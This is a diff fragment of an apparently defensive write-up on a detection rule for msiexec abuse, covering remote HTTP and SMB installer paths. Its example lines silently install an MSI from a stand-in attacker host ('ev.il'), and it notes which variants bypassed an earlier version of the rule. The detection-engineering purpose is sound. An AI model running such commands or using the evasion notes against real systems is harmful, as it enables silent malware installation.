@@ -113,7 +113,7 @@ This way, there must be an argument starting with "https://zoom.us/client/\*". A
 msiexec -i https://ev.il/install.msi /qn /quiet "https://zoom.us/client/"  # error
 ```
 
-Another change is I added "\\\\" to process.command_line because msiexec supports executing installers from remote SMB shares. But it does not support FTP or Gopher so we're good. So, the following msiexec command would work and would not get detected in the initial version but now it will.
+Another change is I added "\\\\" to process.command_line because msiexec supports executing installers from remote SMB shares. But it does not support FTP or Gopher so we're good. The following msiexec command would work and would not get detected in the initial version but the modified version detects it.
 
 ```powershell
 msiexec -i \\ev.il\install.msi /qn /quiet  # valid, installs program from remote share and bypasses the first variant of the detection rule
